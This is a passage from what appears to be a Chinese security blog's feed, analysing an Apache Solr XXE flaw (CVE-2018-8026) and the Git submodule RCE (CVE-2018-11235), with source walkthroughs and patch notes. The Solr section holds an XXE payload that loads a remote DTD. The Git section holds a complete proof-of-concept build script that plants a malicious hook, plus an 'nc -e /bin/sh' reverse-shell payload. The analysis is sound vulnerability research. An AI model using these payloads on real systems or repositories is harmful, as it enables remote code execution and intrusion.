<p>代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">reload</span><span class="params">()</span> <span class="keyword">throws</span> SolrException </span>&#123;</div><div class="line">  InputStream is = <span class="keyword">null</span>;</div><div class="line">  Map&lt;String, Map&lt;String, Double&gt;&gt; tmpRates = <span class="keyword">new</span> HashMap&lt;&gt;();</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    log.debug(<span class="string">"Reloading exchange rates from file "</span>+<span class="keyword">this</span>.currencyConfigFile);</div><div class="line"></div><div class="line">    is = loader.openResource(currencyConfigFile);</div><div class="line">    javax.xml.parsers.DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      dbf.setXIncludeAware(<span class="keyword">true</span>);</div><div class="line">      dbf.setNamespaceAware(<span class="keyword">true</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (UnsupportedOperationException e) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> SolrException(SolrException.ErrorCode.BAD_REQUEST, <span class="string">"XML parser doesn't support XInclude option"</span>, e);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      Document doc = dbf.newDocumentBuilder().parse(is);</div></pre></td></tr></table></figure></p>
<p><code>currencyConfigFile</code>即前面的currency.xml，<br>通过<code>is = loader.openResource(currencyConfigFile);</code>读取了内容后，在最后把<code>is</code>对象传给了<code>dbf</code>。在<code>dbf.newDocumentBuilder().parse(is);</code>解析了外部实体，造成了xxe。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f1117a20-88db-1.png" alt="2.jpg"></p>
<h2 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE 2"></a>XXE 2</h2><p>同样发生在对<code>schema.xml</code>的解析中，我们修改<code>schema.xml</code>的内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"string"</span> <span class="attr">class</span>=<span class="string">"solr.StrField"</span> /&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"priorityLevel"</span> <span class="attr">class</span>=<span class="string">"solr.EnumFieldType"</span> <span class="attr">docValues</span>=<span class="string">"true"</span> <span class="attr">enumsConfig</span>=<span class="string">"enumsConfig.xml"</span> <span class="attr">enumName</span>=<span class="string">"priority"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>enumsConfig.xml</code>内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt;    %remote;    ]&gt;</span></div></pre></td></tr></table></figure></p>
<p>将<code>schema.xml</code>，<code>enumsConfig.xml</code>和<code>solrconfig.xml</code>打包成zip后，用上面的脚本执行。当solr运行至 org/apache/solr/schema/AbstractEnumField.java:90</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173806-f138933a-88db-1.png" alt="3.jpg"></p>
<p>接着在 org/apache/solr/schema/AbstractEnumField.java:110<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">InputStream is = <span class="keyword">null</span>;</div><div class="line">  </div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    is = schema.getResourceLoader().openResource(enumsConfigFile);</div><div class="line">    <span class="keyword">final</span> DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="keyword">final</span> Document doc = dbf.newDocumentBuilder().parse(is);</div></pre></td></tr></table></figure></p>
<p>同样由于<code>dbf.newDocumentBuilder().parse(is)</code>造成了外部实体的解析</p>
<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>针对 XXE 1 和 XXE 2 的补丁为 <a href="https://issues.apache.org/jira/secure/attachment/12926593/SOLR-12450.patch" target="_blank" rel="external">SOLR-12450.patch</a></p>
<p>其中增加了<code>solr/core/src/java/org/apache/solr/util/SafeXMLParsing.java</code>，其中定义了多种解析xml的方法。比如<code>parseConfigXML</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">/** Parses a config file from ResourceLoader. Xinclude and external entities are enabled, but cannot escape the resource loader. */</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Document <span class="title">parseConfigXML</span><span class="params">(Logger log, ResourceLoader loader, String file)</span> <span class="keyword">throws</span> SAXException, IOException </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">final</span> DocumentBuilder db = dbf.newDocumentBuilder();</div><div class="line">    db.setEntityResolver(<span class="keyword">new</span> SystemIdResolver(loader));</div><div class="line">    db.setErrorHandler(<span class="keyword">new</span> XMLErrorLogger(log));</div><div class="line">    <span class="keyword">return</span> db.parse(in, SystemIdResolver.createSystemIdFromResourceName(file));</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对应的<code>FileExchangeRateProvider.java</code>也换成了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Document doc = SafeXMLParsing.parseConfigXML(log, loader, currencyConfigFile);</div></pre></td></tr></table></figure></p>
<p><code>AbstractEnumField.java</code>则为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Document doc = SafeXMLParsing.parseConfigXML(log, loader, enumsConfigFile);</div></pre></td></tr></table></figure></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://issues.apache.org/jira/browse/SOLR-12450" target="_blank" rel="external">SolrSOLR-12450</a></li>
<li><a href="https://lucene.apache.org/solr/guide/6_6/configsets-api.html" target="_blank" rel="external">Sorl: ConfigSets API</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2448&quot;&gt;Apache Solr XXE漏洞分析 -【CVE-2018-8026】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="xxe" scheme="http://chybeta.github.io/tags/xxe/"/>
    
      <category term="apache" scheme="http://chybeta.github.io/tags/apache/"/>
    
      <category term="solr" scheme="http://chybeta.github.io/tags/solr/"/>
    
  </entry>
  
  <entry>
    <title>RCE with Git submodule分析-【CVE-2018-11235】</title>
    <link href="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-11235%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/</id>
    <published>2018-05-31T08:25:02.000Z</published>
    <updated>2018-07-05T00:33:24.275Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2371" target="_blank" rel="external">RCE with Git submodule 分析-【CVE-2018-11235】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dac66d0a-67bd-1.png" alt="1.png"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Github上已经放出了<a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a>，原POC还需要git clone Spoon-Knife，对此我做了一些小修改。可以见<a href="https://github.com/CHYbeta/CVE-2018-11235-DEMO" target="_blank" rel="external">CVE-2018-11235-DEMO</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/CHYbeta/CVE-2018-11235-DEMO.git</div><div class="line">./build.sh</div></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dae0b0f2-67bd-1.gif" alt="demo.gif"></p>
<p>个人本地测试Git版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu  ~/CVE-2018-11235  git --version</div><div class="line">git version 2.17.0</div></pre></td></tr></table></figure></p>
<p>其中 build.sh　主要内容如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">set</span> <span class="_">-e</span></div><div class="line"></div><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div><div class="line"></div><div class="line">repo_par=<span class="string">"<span class="variable">$PWD</span>/repo_par"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"></div><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div><div class="line"></div><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div><div class="line"></div><div class="line">git config <span class="_">-f</span> .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div><div class="line"></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span></div><div class="line"></div><div class="line">git commit -m <span class="string">"CVE-2018-11235"</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"git clone --recurse-submodules \"<span class="variable">$repo_par</span>\" dest_dir"</span></div></pre></td></tr></table></figure></p>
<p>vuln.sh:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">nc -e /bin/sh 127.0.0.1 12345</div></pre></td></tr></table></figure></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在Git中存在<a href="https://git-scm.com/book/zh/v1/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git%E6%8C%82%E9%92%A9" target="_blank" rel="external">Git Hooks</a>的操作，它们被存放在一个repo的<code>.git</code>目录下的hooks文件目录下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-daf553fe-67bd-1.png" alt="2.png"></p>
<p>当配置了这些hooks后，其本质上是脚本文件，会被Git所调用。以<code>post-checkout</code>挂钩为例，如果在hooks中存在一个<code>post-checkout</code>脚本，则当在该repo中执行<code>git checkout</code>指令时，则会自动的去执行hooks目录下的<code>post-checkout</code>脚本。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db0bfa6e-67bd-1.png" alt="3.png"></p>
<p>正常情况下，这些hook脚本并不会在clone期间进行传送。也就是说这些脚本是由客户端自己定制的。否则的话，服务端直接在repo中插入hook文件则直接造成了RCE。如下测试，clone的repo3中的hook目录中是没有<code>post-checkout</code>脚本的:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db25903c-67bd-1.png" alt="4.png"></p>
<p>而此次的RCE则是利用了Git的子模块功能，绕过了hook文件的限制。通过对子模块配置，将hook文件推送到了客户端中，从而造成RCE。</p>
<p>先介绍一下submodules即子模块。在一些项目中，项目本身需要包含并使用另外一个项目，而这两个项目又是相互独立的。为了保持提交的独立等，可以在Git中使用子模块submodules来解决。</p>
<p>以前面的build.sh中的内容为例：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div></pre></td></tr></table></figure></p>
<p>这里我们创建了一个仓库repo_sub，接着通过<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div></pre></td></tr></table></figure></p>
<p>将repo_sub作为子模块添加到了仓库repo_par中，同时指定了路径<code>vuln</code>(即别名)。</p>
<p>在<a href="https://git-scm.com/docs/gitsubmodules" target="_blank" rel="external">Git文档:gitsubmodules</a>中提到：</p>
<blockquote>
<blockquote>
<p>On the filesystem, a submodule usually (but not always - see FORMS below) consists of (i) a Git directory located under the $GIT_DIR/modules/ directory of its superproject, (ii) a working directory inside the superproject’s working directory, and a .git file at the root of the submodule’s working directory pointing to (i).</p>
</blockquote>
</blockquote>
<p>对于子模块而言，通常情况下，子模块的Git目录存放在<code>$GIT_DIR/modules/</code>中，而其工作目录即父项目的工作目录，同时在工作目录下还有一个<code>.git</code>文件来指向其Git目录。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db3c1578-67bd-1.png" alt="7.png"></p>
<p>当添加子模块完成后，在repo_par中会出现<code>.gitmodules</code>文件，该配置文件保存了项目 URL 与已经拉取的本地目录之间的映射。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db4bf8d0-67bd-1.png" alt="5.png"></p>
<p><code>.gitmodules</code>文件同样受到版本控制的影响，会一起进行推送。这样clone的用户才知道去哪里拉取具体的子模块内容。它的文件格式可以见<a href="https://git-scm.com/docs/gitmodules" target="_blank" rel="external">官方文档gitmodules</a>：</p>
<p>这里对子模块<code>vuln</code>而言，它的<code>name</code>就是<code>vuln</code>,<code>path</code>就是<code>vuln</code>,url即为<code>./../repo_sub</code>。关于这个name，在官方文档中有这样一些表述：</p>
<blockquote>
<blockquote>
<p>The file contains one subsection per submodule, and the subsection value is the name of the submodule. The name is set to the path where the submodule has been added unless it was customized with the —name option of git submodule add. Each submodule section also contains the following required keys….</p>
</blockquote>
</blockquote>
<p>接下来以git version 2.17.0为例，根据Git源代码看看漏洞的触发点。当repo存在submodule时，会从<code>.gitmodules</code>文件中读取相关信息，并将信息保存到cache中以节省资源。在submodule-config.c第563行<code>gitmodules_cb</code>的最后将会调用<code>parse_config</code>对<code>.gitmodules</code>进行解析：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">gitmodules_cb</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> repository *repo = data;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter parameter;</div><div class="line"></div><div class="line">	parameter.cache = repo-&gt;submodule_cache;</div><div class="line">	parameter.treeish_name = <span class="literal">NULL</span>;</div><div class="line">	parameter.gitmodules_sha1 = null_sha1;</div><div class="line">	parameter.overwrite = <span class="number">1</span>;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> parse_config(var, value, &amp;parameter);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>submodule-config.c第362行：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">parse_config</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter *me = data;</div><div class="line">	<span class="keyword">struct</span> submodule *submodule;</div><div class="line">	<span class="keyword">struct</span> strbuf name = STRBUF_INIT, item = STRBUF_INIT;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">/* this also ensures that we only parse submodule entries */</span></div><div class="line">	<span class="keyword">if</span> (!name_and_item_from_var(var, &amp;name, &amp;item))</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">   	submodule = lookup_or_create_by_name(me-&gt;cache,</div><div class="line">					     me-&gt;gitmodules_sha1,</div><div class="line">					     name.buf);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>name_and_item_from_var(var, &amp;name, &amp;item)</code>用于从变量<code>var</code>中获得name值，具体代码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// submodule-config.c</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">name_and_item_from_var</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">struct</span> strbuf *name,</span></span></div><div class="line">				  <span class="keyword">struct</span> strbuf *item)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *subsection, *key;</div><div class="line">	<span class="keyword">int</span> subsection_len, parse;</div><div class="line">	parse = parse_config_key(var, <span class="string">"submodule"</span>, &amp;subsection,</div><div class="line">			&amp;subsection_len, &amp;key);</div><div class="line">	<span class="keyword">if</span> (parse &lt; <span class="number">0</span> || !subsection)</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">	strbuf_add(name, subsection, subsection_len);</div><div class="line">	strbuf_addstr(item, key);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>假设<code>.gitmodules</code>中内容为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[submodule &quot;vuln&quot;]</div><div class="line">	path = vuln</div><div class="line">	url = ./../repo_sub</div></pre></td></tr></table></figure></p>
<p>则通过parse_config_key解析出来的subsection会通过strbuf_add被添加到name中，即此时name的值为<code>vuln</code></p>
<p>回到<code>parse_config</code>中，此后将通过<code>lookup_or_create_by_name(me-&gt;cache,me-&gt;gitmodules_sha1,name.buf)</code>获取子模块的信息并进行一系列操作。</p>
<p>在 <code>submodule.c</code>第1617行，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">submodule_move_head</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path,</span></span></div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *old_head,</div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *new_head,</div><div class="line">			 <span class="keyword">unsigned</span> flags)</div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 第 1617 行</span></div><div class="line">	<span class="keyword">if</span> (!(flags &amp; SUBMODULE_MOVE_HEAD_DRY_RUN)) &#123;</div><div class="line">		<span class="keyword">if</span> (old_head) &#123;</div><div class="line">			<span class="keyword">if</span> (!submodule_uses_gitfile(path))</div><div class="line">				absorb_git_dir_into_superproject(<span class="string">""</span>, path,</div><div class="line">					ABSORB_GITDIR_RECURSE_SUBMODULES);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line"></div><div class="line">			<span class="comment">/* make sure the index is clean as well */</span></div><div class="line">			submodule_reset_index(path);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (old_head &amp;&amp; (flags &amp; SUBMODULE_MOVE_HEAD_FORCE)) &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这通过<code>xstrfmt(&quot;%s/modules/%s&quot;,get_git_common_dir(), sub-&gt;name)</code>来获得子模块的Git目录。在正常情况下，对于子模块 vuln 而言，<code>get_git_common_dir</code>即父repo的Git目录，即<code>.git</code>。<code>sub-&gt;name</code>即前面获得的name值。拼接完成后子模块的Git目录即为<code>.git/modules/vuln</code></p>
<p>但从前面的代码看来，对于<code>name</code>和<code>sub-&gt;name</code>，Git并没有做相关的输入检查/路径检查。如果我们通过设置<code>name</code>为<code>../../vuln</code>，则拼接后的路径即<code>.git/modules/../../vuln</code>，即当前目录下的<code>vuln</code>目录。这里存在一个目录穿越漏洞，之后的解析将把当前目录下的<code>vuln</code>目录当做子模块的Git目录。</p>
<p>前面说到，<code>.git/hooks</code>目录中的hook脚本并不会在clone期间进行传送。结合目录穿越漏洞，我们考虑这样的攻击方式:</p>
<ol>
<li>将目录<code>.git/modules/vuln</code>拷贝到当前目录<code>modules</code>下。</li>
<li>往<code>modules/vuln</code>目录中的hooks目录添加hook脚本</li>
<li>构造子模块，使其name成为<code>../../modules/vuln</code>，使子模块的Git目录信息指向当前目录下<code>module/vuln</code></li>
<li>构造repo，使其在git clone时触发hook脚本</li>
</ol>
<p>先考虑前2条，即对应build.sh中下述代码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db698576-67bd-1.png" alt="8.png"></p>
<p>第三条：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db7682ee-67bd-1.png" alt="9.png"></p>
<p>第四点，为了让<code>.git/modules/../../modules/vuln</code>即<code>modules/vuln</code>下的hooks目录中的hook脚本被调用，执行下述语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule add &quot;$repo_submodule&quot;</div><div class="line">git commit -m &quot;CVE-2018-11235&quot;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db854040-67bd-1.png" alt="10.png"></p>
<p>再添加一个子模块。当Git地进行<code>git clone --recurse-submodules</code>时，会发现clone下来的目录中已经有了对应的子模块项目，因此实际上不需要clone，只要进行check out就行。而在check out时则会调用post-checkout脚本。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dba256e4-67bd-1.png" alt="11.png"></p>
<p>上述的分析针对 git version 2.17.0 进行。在一些低版本的Git中，由于功能等差异，可能上述环境会出错。Tony Torralba在其博客中复现了Git 2.7.4版本的漏洞，需要利用符号链接来进行RCE，具体的利用过程见 <a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">CVE-2018-11235 - Quick &amp; Dirty PoC</a></p>
<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>补丁见：<a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44" target="_blank" rel="external">https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44</a></p>
<p>主要是对从<code>.gitmodules</code>中获取的name进行了检查</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbbd8cac-67bd-1.png" alt="12.png"></p>
<p>在<code>name_and_item_from_var(var, &amp;name, &amp;item)</code>函数中调用了<code>check_submodule_name</code>来进行检查：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbd119f2-67bd-1.png" alt="13.png"></p>
<p>Git在14年也爆过RCE洞(CVE-2014–9390)，其原理也是利用了目录穿越加覆盖配置文件，在checkout时进行RCE。具体可见参考链接。</p>
<p>有些地方可能没解释清楚或有不当的地方，欢迎留言讨论。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a></li>
<li><a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/" target="_blank" rel="external">Remediating the May 2018 Git Security Vulnerability</a></li>
<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E5%AD%90%E6%A8%A1%E5%9D%97" target="_blank" rel="external">Git 工具 - 子模块</a></li>
<li><a href="https://blog.github.com/2014-12-18-vulnerability-announced-update-your-git-clients/" target="_blank" rel="external">CVE-2014–9390</a></li>
